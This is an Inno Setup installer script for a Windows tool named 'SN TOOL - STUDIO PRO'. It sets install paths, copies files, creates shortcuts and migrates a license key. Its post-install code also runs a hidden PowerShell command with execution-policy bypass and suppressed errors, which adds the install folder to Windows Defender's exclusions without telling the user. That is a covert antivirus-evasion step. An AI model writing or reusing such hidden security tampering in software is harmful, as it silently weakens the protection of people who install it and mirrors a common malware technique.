; Inno Setup 6 Script for SN TOOL - STUDIO PRO
#define MyAppName "SN TOOL - STUDIO PRO"
#define MyAppVersion "1.1.3"
#define MyAppPublisher "SN STUDIO"
#define MyAppExeName "SN_TOOL.exe"

[Setup]
AppId={{E8A63102-18A3-4B9F-84E0-B597B08C6E2A}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={code:GetDefaultInstallDir}
DefaultGroupName={#MyAppName}
DisableDirPage=no
DisableProgramGroupPage=yes
UsePreviousAppDir=yes
AlwaysShowDirOnReadyPage=yes
DirExistsWarning=no
OutputDir=D:\\Sal\\SN\\dist
OutputBaseFilename=SN_TOOL_Setup
SetupIconFile=D:\\Sal\\SN\\icon.ico
Compression=lzma2/max
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
CloseApplications=yes
CloseApplicationsFilter=*.exe
RestartApplications=no
ArchitecturesInstallIn64BitMode=x64
UninstallDisplayIcon={app}\{#MyAppExeName}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"

[Files]
Source: "D:\\Sal\\SN\\dist\\SN_TOOL\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs; Excludes: "license.key, *.bak, *.tmp, *.log"

[Icons]
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\icon.ico"; WorkingDir: "{app}"; Tasks: desktopicon
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\icon.ico"; WorkingDir: "{app}"

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "Launch SN TOOL - STUDIO PRO"; Flags: nowait postinstall skipifsilent

[Code]
function GetDefaultInstallDir(Param: String): String;
begin
  // 1. If D:\SN_TOOL already exists on the PC, use it directly!
  if DirExists('D:\SN_TOOL') then
  begin
    Result := 'D:\SN_TOOL';
    Exit;
  end;
  // 2. If Drive D: exists, default to D:\SN_TOOL as requested by user
  if DirExists('D:') then
  begin
    Result := 'D:\SN_TOOL';
    Exit;
  end;
  // 3. Fallback to LocalAppData on Drive C:
  Result := ExpandConstant('{localappdata}\Programs\SN_TOOL');
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    // Create self-healing backup of main binary
    FileCopy(ExpandConstant('{app}\SN_TOOL.exe'), ExpandConstant('{app}\SN_TOOL.exe.bak'), False);
    
    // Auto-migrate license.key if upgrading from another directory
    if not FileExists(ExpandConstant('{app}\license.key')) then
    begin
      if FileExists('D:\SN_TOOL\license.key') then
        FileCopy('D:\SN_TOOL\license.key', ExpandConstant('{app}\license.key'), False)
      else if FileExists(ExpandConstant('{localappdata}\Programs\SN_TOOL\license.key')) then
        FileCopy(ExpandConstant('{localappdata}\Programs\SN_TOOL\license.key'), ExpandConstant('{app}\license.key'), False);
    end;

    // Background PowerShell defender exclusion attempt (non-blocking)
    Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -ErrorAction SilentlyContinue"', '', SW_HIDE, ewNoWait, ResultCode);
  end;
end;
